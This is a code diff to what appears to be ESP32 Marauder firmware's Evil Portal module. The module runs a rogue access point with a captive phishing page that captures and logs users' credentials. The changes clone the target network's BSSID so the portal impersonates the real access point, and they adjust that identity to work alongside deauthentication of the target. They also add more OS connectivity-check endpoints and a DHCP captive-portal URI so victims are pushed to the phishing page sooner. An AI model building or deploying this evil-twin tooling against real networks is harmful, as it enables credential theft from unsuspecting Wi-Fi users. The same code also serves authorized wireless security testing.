@@ -1,6 +1,12 @@
 #include "EvilPortal.h"
 #include "MiniV3WiFi6.h"
 
+#if defined(MARAUDER_MINI_V3) && defined(ARDUINO_ESP32C5_DEV)
+  #include "esp_err.h"
+  #include "esp_idf_version.h"
+  #include "esp_wifi.h"
+#endif
+
 char apName[MAX_AP_NAME_SIZE] = "PORTAL";
 
 #ifdef HAS_PSRAM
@@ -16,6 +22,19 @@ constexpr const char* LEGACY_EVIL_PORTAL_CREDENTIAL_LOG =
     "/evil_portal_credentials.log";
 constexpr int EVIL_PORTAL_MAX_CREDENTIALS = 100;
 constexpr size_t EVIL_PORTAL_MAX_FIELD_LENGTH = 128;
+
+bool usableBSSID(const uint8_t* bssid) {
+  if (bssid == nullptr || (bssid[0] & 0x01) != 0)
+    return false;
+
+  bool all_zero = true;
+  bool all_ff = true;
+  for (uint8_t index = 0; index < 6; index++) {
+    all_zero = all_zero && bssid[index] == 0x00;
+    all_ff = all_ff && bssid[index] == 0xff;
+  }
+  return !all_zero && !all_ff;
+}
 
 String credentialLogReadPath() {
   if (SD.exists(marauder::storage::EVIL_PORTAL_CREDENTIALS))
@@ -34,6 +53,17 @@ String credentialField(String value) {
 }
 }
 
+CaptiveRequestHandler::CaptiveRequestHandler(EvilPortal* portal)
+    : portal(portal) {}
+
+void CaptiveRequestHandler::handleRequest(AsyncWebServerRequest *request) {
+  if (portal == nullptr) {
+    request->send(503, "text/plain", "Portal unavailable");
+    return;
+  }
+  portal->servePortalPage(request);
+}
+
 void EvilPortal::setup() {
   this->runServer = false;
   this->name_received = false;
@@ -41,6 +71,10 @@ void EvilPortal::setup() {
   this->has_html = false;
   this->has_ap = false;
   this->using_serial_html = false;
+  this->portal_request_count = 0;
+  this->last_portal_request_ms = 0;
+  this->client_has_portal_activity = false;
+  this->last_client_count = 0;
 
   html_files = new LinkedList<String>();
   captured_credentials = new LinkedList<PortalCredential>();
@@ -100,6 +134,7 @@ void EvilPortal::cleanup() {
   if (portal_was_running) {
     this->dnsServer.stop();
     server.end();
+    this->restoreOriginalBSSID();
     // Leave AP and driver teardown to WiFiScan::shutdownWiFi(). Calling
     // softAPdisconnect() here would first call AP.begin(), which is unnecessary
     // during shutdown and can allocate or re-enable network resources.
@@ -112,6 +147,11 @@ void EvilPortal::cleanup() {
   this->has_html = false;
   this->has_ap = false;
   this->using_serial_html = false;
+  this->target_ap_bssid_valid = false;
+  this->portal_request_count = 0;
+  this->last_portal_request_ms = 0;
+  this->client_has_portal_activity = false;
+  this->last_client_count = 0;
 }
 
 bool EvilPortal::begin(LinkedList<ssid>* ssids, LinkedList<AccessPoint>* access_points) {
@@ -261,6 +301,18 @@ uint8_t EvilPortal::getConnectedClientCount() {
   return this->runServer ? WiFi.softAPgetStationNum() : 0;
 }
 
+uint32_t EvilPortal::getPortalRequestCount() const {
+  return this->portal_request_count;
+}
+
+uint32_t EvilPortal::getLastPortalRequestMs() const {
+  return this->last_portal_request_ms;
+}
+
+bool EvilPortal::hasPortalActivity() const {
+  return this->client_has_portal_activity;
+}
+
 bool EvilPortal::isRunning() const {
   return this->runServer;
 }
@@ -291,27 +343,9 @@ bool EvilPortal::clearCredentials() {
 }
 
 void EvilPortal::setupServer() {
-  #ifndef HAS_PSRAM
-    server.on("/", HTTP_GET, [this](AsyncWebServerRequest *request) {
-      request->send_P(200, "text/html", index_html);
-      Serial.println(F("client connected"));
-      #ifdef HAS_SCREEN
-        this->sendToDisplay(F("Client connected to server"));
-      #endif
-    });
-  #else
-    server.on("/", HTTP_GET, [this](AsyncWebServerRequest *request) {
-      if (!this->has_html || index_html == nullptr) {
-        request->send(503, "text/plain", "Portal content is not loaded");
-        return;
-      }
-      request->send(200, "text/html", index_html);
-      Serial.println("client connected");
-      #ifdef HAS_SCREEN
-        this->sendToDisplay(F("Client connected to server"));
-      #endif
-    });
-  #endif
+  server.on("/", HTTP_ANY, [this](AsyncWebServerRequest *request) {
+    this->servePortalPage(request);
+  });
 
   const char* captiveEndpoints[] = {
     "/hotspot-detect.html",
@@ -319,33 +353,31 @@ void EvilPortal::setupServer() {
     "/success.txt",
     "/generate_204",
     "/gen_204",
+    "/connectivitycheck/generate_204",
+    "/mobile/status.php",
     "/ncsi.txt",
     "/connecttest.txt",
-    "/redirect"
+    "/redirect",
+    "/canonical.html",
+    "/check_network_status.txt",
+    "/fwlink"
   };
 
-  for (int i = 0; i < sizeof(captiveEndpoints) / sizeof(captiveEndpoints[0]); i++) {
-    
-    #ifndef HAS_PSRAM
-      server.on(captiveEndpoints[i], HTTP_GET, [this](AsyncWebServerRequest *request){
-        request->send_P(200, "text/html", index_html);
-      });
-    #else
-      server.on(captiveEndpoints[i], HTTP_GET, [this](AsyncWebServerRequest *request){
-        if (!this->has_html || index_html == nullptr) {
-          request->send(503, "text/plain", "Portal content is not loaded");
-          return;
-        }
-        request->send(200, "text/html", index_html);
-      });
-    #endif
+  for (size_t i = 0;
+       i < sizeof(captiveEndpoints) / sizeof(captiveEndpoints[0]); i++) {
+    server.on(captiveEndpoints[i], HTTP_ANY,
+              [this](AsyncWebServerRequest *request) {
+      this->servePortalPage(request);
+    });
   }
 
   server.on("/get-ap-name", HTTP_GET, [this](AsyncWebServerRequest *request) {
+    this->notePortalRequest();
     request->send(200, "text/plain", WiFi.softAPSSID());
   });
 
   server.on("/get", HTTP_GET, [this](AsyncWebServerRequest *request) {
+    this->notePortalRequest();
     String inputMessage;
     String inputParam;
 
@@ -366,6 +398,54 @@ void EvilPortal::setupServer() {
       200, "text/html",
       "<html><head><script>setTimeout(() => { window.location.href ='/' }, 100);</script></head><body></body></html>");
   });
+}
+
+void EvilPortal::notePortalRequest() {
+  this->portal_request_count++;
+  this->last_portal_request_ms = millis();
+  this->client_has_portal_activity = true;
+}
+
+void EvilPortal::servePortalPage(AsyncWebServerRequest* request) {
+  if (request == nullptr)
+    return;
+
+  #ifdef HAS_PSRAM
+    if (!this->has_html || index_html == nullptr) {
+      request->send(503, "text/plain", "Portal content is not loaded");
+      return;
+    }
+  #endif
+
+  this->notePortalRequest();
+  AsyncWebServerResponse* response = nullptr;
+  #ifdef HAS_PSRAM
+    response = request->beginResponse(200, "text/html", index_html);
+  #else
+    response = request->beginResponse_P(200, "text/html", index_html);
+  #endif
+  if (response == nullptr) {
+    request->send(503, "text/plain", "Portal response unavailable");
+    return;
+  }
+  response->addHeader("Cache-Control",
+                      "no-store, no-cache, must-revalidate, max-age=0");
+  response->addHeader("Pragma", "no-cache");
+  response->addHeader("Expires", "0");
+  response->addHeader("Connection", "close");
+  request->send(response);
+}
+
+void EvilPortal::updateClientState() {
+  const uint8_t clients = this->getConnectedClientCount();
+  if (clients == this->last_client_count)
+    return;
+
+  Serial.printf("[Evil Portal] clients %u -> %u\n",
+                this->last_client_count, clients);
+  if (clients == 0)
+    this->client_has_portal_activity = false;
+  this->last_client_count = clients;
 }
 
 bool EvilPortal::installHtml(const char* html, size_t length) {
@@ -527,7 +607,8 @@ bool EvilPortal::setAP(LinkedList<ssid>* ssids, LinkedList<AccessPoint>* access_
     if (targ_ap_index >= 0 && targ_ap_index < access_points->size())
       this->setTargetAP(targ_ap_index,
                         access_points->get(targ_ap_index).channel,
-                        access_points->get(targ_ap_index).wifi_generation);
+                        access_points->get(targ_ap_index).wifi_generation,
+                        access_points->get(targ_ap_index).bssid);
     else
       this->setTargetAP(-1, 1);
     return true;
@@ -576,22 +657,28 @@ bool EvilPortal::setAP(String essid) {
   this->has_ap = true;
   this->target_ap_index = -1;
   this->target_ap_channel = 1;
+  this->target_ap_bssid_valid = false;
   Serial.println(F("ap config set"));
   return true;
 }
 
 void EvilPortal::setTargetAP(int index, uint8_t channel,
-                             uint8_t wifi_generation) {
+                             uint8_t wifi_generation,
+                             const uint8_t* bssid) {
   if (index < 0 || channel == 0) {
     this->target_ap_index = -1;
     this->target_ap_channel = 1;
     this->target_wifi_generation = WIFI_GENERATION_6;
+    this->target_ap_bssid_valid = false;
     return;
   }
 
   this->target_ap_index = index;
   this->target_ap_channel = channel;
   this->target_wifi_generation = wifi_generation;
+  this->target_ap_bssid_valid = usableBSSID(bssid);
+  if (this->target_ap_bssid_valid)
+    memcpy(this->target_ap_bssid, bssid, sizeof(this->target_ap_bssid));
 }
 
 int EvilPortal::getTargetAPIndex() const {
@@ -602,31 +689,151 @@ uint8_t EvilPortal::getTargetAPChannel() const {
   return this->target_ap_channel;
 }
 
+bool EvilPortal::applyTargetBSSID() {
+  #if defined(MARAUDER_MINI_V3) && defined(ARDUINO_ESP32C5_DEV)
+    if (!this->target_ap_bssid_valid)
+      return true;
+
+    esp_err_t status = esp_wifi_get_mac(WIFI_IF_AP,
+                                        this->original_softap_bssid);
+    if (status != ESP_OK) {
+      Serial.printf("Evil Portal could not read the SoftAP BSSID: %s\n",
+                    esp_err_to_name(status));
+      return false;
+    }
+
+    memcpy(this->runtime_softap_bssid, this->target_ap_bssid,
+           sizeof(this->runtime_softap_bssid));
+    const bool deauth_enabled = settings_obj.loadSetting<bool>("EPDeauth");
+    if (deauth_enabled) {
+      // An exact BSSID combined with our target's deauth frames would also
+      // identify the portal itself and could eject a client as it associates.
+      // Preserve the target-derived identity but make it locally administered
+      // and distinct while concurrent deauth is enabled.
+      this->runtime_softap_bssid[0] =
+          (this->runtime_softap_bssid[0] | 0x02) & 0xfe;
+      if (memcmp(this->runtime_softap_bssid, this->target_ap_bssid,
+                 sizeof(this->runtime_softap_bssid)) == 0)
+        this->runtime_softap_bssid[5] ^= 0x01;
+      if (memcmp(this->runtime_softap_bssid, this->original_softap_bssid,
+                 sizeof(this->runtime_softap_bssid)) == 0)
+        this->runtime_softap_bssid[5] ^= 0x02;
+    }
+
+    status = esp_wifi_set_mac(WIFI_IF_AP, this->runtime_softap_bssid);
+    if (status != ESP_OK) {
+      Serial.printf("Evil Portal could not set the portal BSSID: %s\n",
+                    esp_err_to_name(status));
+      return false;
+    }
+    this->softap_bssid_overridden = true;
+    Serial.printf("Evil Portal BSSID %02X:%02X:%02X:%02X:%02X:%02X "
+                  "(%s target)\n",
+                  this->runtime_softap_bssid[0],
+                  this->runtime_softap_bssid[1],
+                  this->runtime_softap_bssid[2],
+                  this->runtime_softap_bssid[3],
+                  this->runtime_softap_bssid[4],
+                  this->runtime_softap_bssid[5],
+                  deauth_enabled ? "derived from" : "exact");
+  #endif
+  return true;
+}
+
+void EvilPortal::restoreOriginalBSSID() {
+  #if defined(MARAUDER_MINI_V3) && defined(ARDUINO_ESP32C5_DEV)
+    if (!this->softap_bssid_overridden)
+      return;
+
+    // esp_wifi_set_mac() requires the target interface to be disabled. Move
+    // briefly to STA-only mode before restoring the runtime SoftAP identity;
+    // generic teardown turns Wi-Fi fully off immediately afterwards.
+    wifi_mode_t mode = WIFI_MODE_NULL;
+    if (esp_wifi_get_mode(&mode) == ESP_OK &&
+        (mode & WIFI_MODE_AP) != 0 && !WiFi.mode(WIFI_STA)) {
+      Serial.println(F("Evil Portal could not disable AP before BSSID restore"));
+      return;
+    }
+    const esp_err_t status = esp_wifi_set_mac(WIFI_IF_AP,
+                                              this->original_softap_bssid);
+    if (status != ESP_OK)
+      Serial.printf("Evil Portal could not restore the SoftAP BSSID: %s\n",
+                    esp_err_to_name(status));
+  #endif
+  this->softap_bssid_overridden = false;
+}
+
 bool EvilPortal::startAP() {
   const IPAddress AP_IP(172, 0, 0, 1);
 
+  // Initialize the Arduino Wi-Fi owner with AP disabled. ESP-IDF only permits
+  // assigning an interface MAC while that interface is disabled.
+  if (!WiFi.mode(WIFI_STA)) {
+    Serial.println(F("Evil Portal could not initialize Wi-Fi"));
+    return false;
+  }
+  if (!this->applyTargetBSSID()) {
+    WiFi.mode(WIFI_OFF);
+    return false;
+  }
   if (!WiFi.mode(WIFI_AP)) {
     Serial.println(F("Evil Portal could not enable AP mode"));
+    this->restoreOriginalBSSID();
+    WiFi.mode(WIFI_OFF);
     return false;
   }
   if (!configureMiniV3SoftAPForTarget(this->target_ap_channel,
                                       this->target_wifi_generation)) {
     Serial.println(F("Evil Portal could not mirror target Wi-Fi generation"));
+    this->restoreOriginalBSSID();
     WiFi.mode(WIFI_OFF);
     return false;
   }
   if (!WiFi.softAPConfig(AP_IP, AP_IP, IPAddress(255, 255, 255, 0)) ||
       !WiFi.softAP(apName, nullptr, this->target_ap_channel)) {
     Serial.println(F("Evil Portal could not start the SoftAP"));
+    this->restoreOriginalBSSID();
     WiFi.mode(WIFI_OFF);
     return false;
   }
 
   if (WiFi.softAPSSID() != String(apName) || WiFi.softAPIP() != AP_IP) {
     Serial.println(F("Evil Portal SoftAP readiness validation failed"));
+    this->restoreOriginalBSSID();
     WiFi.mode(WIFI_OFF);
     return false;
   }
+
+  #if defined(MARAUDER_MINI_V3) && defined(ARDUINO_ESP32C5_DEV)
+    uint8_t active_bssid[6] = {};
+    uint8_t active_channel = 0;
+    wifi_second_chan_t secondary_channel = WIFI_SECOND_CHAN_NONE;
+    const bool bssid_mismatch = this->target_ap_bssid_valid &&
+        (esp_wifi_get_mac(WIFI_IF_AP, active_bssid) != ESP_OK ||
+         memcmp(active_bssid, this->runtime_softap_bssid,
+                sizeof(active_bssid)) != 0);
+    const bool channel_mismatch =
+        esp_wifi_get_channel(&active_channel, &secondary_channel) != ESP_OK ||
+        active_channel != this->target_ap_channel;
+    if (bssid_mismatch || channel_mismatch) {
+      Serial.printf("Evil Portal radio identity mismatch "
+                    "(BSSID=%s channel=%u expected=%u)\n",
+                    bssid_mismatch ? "bad" : "ok", active_channel,
+                    this->target_ap_channel);
+      this->restoreOriginalBSSID();
+      WiFi.mode(WIFI_OFF);
+      return false;
+    }
+  #endif
+
+  #if defined(MARAUDER_MINI_V3) && defined(ARDUINO_ESP32C5_DEV) && \
+      ESP_IDF_VERSION >= ESP_IDF_VERSION_VAL(5, 4, 2)
+    // Advertise RFC 8910's captive-portal URI through DHCP option 114. Modern
+    // clients can open the assistant immediately instead of waiting for the
+    // periodic HTTP connectivity probe alone.
+    if (!WiFi.AP.enableDhcpCaptivePortal())
+      Serial.println(F("Evil Portal could not advertise DHCP captive URI"));
+  #endif
 
   Serial.print(F("ap ip address: "));
   Serial.println(WiFi.softAPIP());
@@ -640,7 +847,7 @@ bool EvilPortal::startAP() {
   static bool s_server_registered = false;
   if (!s_server_registered) {
     this->setupServer();
-    server.addHandler(new CaptiveRequestHandler()).setFilter(ON_AP_FILTER);
+    server.addHandler(new CaptiveRequestHandler(this)).setFilter(ON_AP_FILTER);
     s_server_registered = true;
   }
   server.begin();
@@ -662,6 +869,10 @@ bool EvilPortal::startPortal() {
   this->password_received = false;
   this->user_name = "";
   this->password = "";
+  this->portal_request_count = 0;
+  this->last_portal_request_ms = 0;
+  this->client_has_portal_activity = false;
+  this->last_client_count = 0;
   if (!this->startAP())
     return false;
   this->runServer = true;
@@ -682,6 +893,7 @@ void EvilPortal::main(uint8_t scan_mode) {
     return;
   }
 
+  this->updateClientState();
   this->dnsServer.processNextRequest();
 
   if (this->name_received && this->password_received) {
